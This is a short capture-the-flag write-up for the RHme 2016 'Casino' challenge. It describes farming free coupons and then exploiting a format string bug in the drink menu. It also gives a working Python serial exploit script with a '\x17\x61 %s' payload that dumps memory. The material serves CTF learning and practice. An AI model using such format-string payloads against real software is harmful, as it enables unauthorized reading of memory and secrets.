# rhme-2016 write-up Casino

<a name="casino"></a>
## Casino (Exploit - 150 pts)
:> String format exploit

first you need free coupons by playing with the Spin [1]<br>
note: you have to repeat this a lot...<br>

Then, select the drink menu.<br>
You'll be asked to select a drink, this menu is only available with free coupons.<br>
This input is printed (if you entered aaa => aaa is displayed).<br>
I tried %s %s and got memory dump !!<br>

Then we tried many address and..Kabooooom ("\x17\x61 %s" as input works good)<br>
note: 0x6117 is for the fun (0x900 max)
``` python
from rhme_serial import *

s = rhme_serial()
tickets = 0
while not tickets:
    trash = s.xfer("4\n")
    trash = s.xfer("1\n")
    trash = s.xfer("S\n")
    trash = s.xfer("\r\n")
    if int(trash.split("left: ")[1][0]):
        tickets = 1
trash = s.xfer("3\n")
print s.xfer("\x17\x61 %s\n")
s.close()
```
